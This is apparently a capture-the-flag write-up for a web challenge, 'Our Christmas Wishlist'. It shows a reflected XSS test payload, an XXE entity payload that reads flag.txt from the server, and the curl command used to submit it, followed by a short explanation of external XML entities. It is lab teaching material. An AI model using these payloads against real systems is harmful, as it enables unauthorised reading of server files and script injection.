# Our Christmas Wishlist

Category: Web
Tag: Web, XXE



## Attack

Simple input/submit form

![1545552814368](/home/hhro/.config/Typora/typora-user-images/1545552814368.png)



In html source, there is interesting function lol().

![1545553195829](/home/hhro/.config/Typora/typora-user-images/1545553195829.png)

It's a common ajax xml function for sending request.

It sends your message in xml form.

After doing some test, we can find server-side xml parser is poor.



It allows XSS.

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```



and It also allows XXE.

```html
<!DOCTYPE foo [
 <!ENTITY flag SYSTEM "flag.txt" >]>
    <message>&flag;</message>
```



There is no way to get flag.txt with local-XSS. It needs privilege.

Fortunately, XXE works and I can leak any file from server.

```bash
curl -X POST -H "Content-Type: application/xml" -d @xxe.xml http://199.247.6.180:12001/
```

```html
<!DOCTYPE foo [
 <!ENTITY flag SYSTEM "flag.txt" >]>
    <message>&flag;</message>
```

<center>[xxe.xml]</center>



## XXE(eXternal XML Entity)

> There is great reference in OWASP(https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing). 
> It's enough to solve this challenge with above reference.

XML support keyword `ENTITY`.

According to W3, It's used to define shortcut for special characters, and it can be declared for internal or external.

Internal means target entity is in DTD(Document Type Definition), and external means target entity is not in DTD.

XXE occurs when it is about external.

External entity should be declared in this form.
`<!ENTITY [name] SYSTEM [PATH] >`

xxe.xml above could be simple example of external entity usage.

If xml-parser meets `&flag`, it exchange `&flag` with contents of `flag.txt`.











